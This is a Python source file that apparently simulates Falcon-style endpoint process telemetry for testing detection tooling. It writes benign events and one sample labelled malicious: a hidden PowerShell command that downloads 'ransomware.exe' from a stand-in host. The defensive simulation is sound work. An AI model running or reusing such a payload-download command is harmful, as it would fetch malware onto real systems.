import json
import random
import time
from utils.logger import Logger


class FalconTelemetrySimulator:
    # FIX: Change default to point inside logs/ folder
    def __init__(self, log_file="logs/falcon_logs.json"):
        self.log_file = log_file

        self.events = [
            {"cmd": "chrome.exe", "args": "https://google.com", "evil": False},
            {"cmd": "outlook.exe", "args": "", "evil": False},
            {
                "cmd": "powershell.exe",
                "args": "-nop -w hidden -c Invoke-WebRequest http://bad-site.com/ransomware.exe",
                "evil": True
            }
        ]

        # This line was already correct!
        self.logger = Logger("falcon", "logs/falcon_simulator.log")

    def generate_event(self):
        event_data = random.choice(self.events)

        telemetry = {
            "event_simpleName": "ProcessRollup2",
            "ComputerName": "DESKTOP-HR-DUBAI-05",
            "UserName": "naif.nizami",
            "TargetFileName": f"\\Device\\HarddiskVolume1\\Windows\\System32\\{event_data['cmd']}",
            "CommandLine": f"{event_data['cmd']} {event_data['args']}",
            "ParentBaseFileName": "explorer.exe",
            "ContextTimeStamp": time.time(),
            "is_malicious": event_data["evil"]
        }

        return telemetry

    def write_to_log(self, event):
        with open(self.log_file, "a") as f:
            f.write(json.dumps(event) + "\n")

        self.logger.info(
            f"Generated Falcon telemetry: {event['CommandLine']} | Malicious={event['is_malicious']}"
        )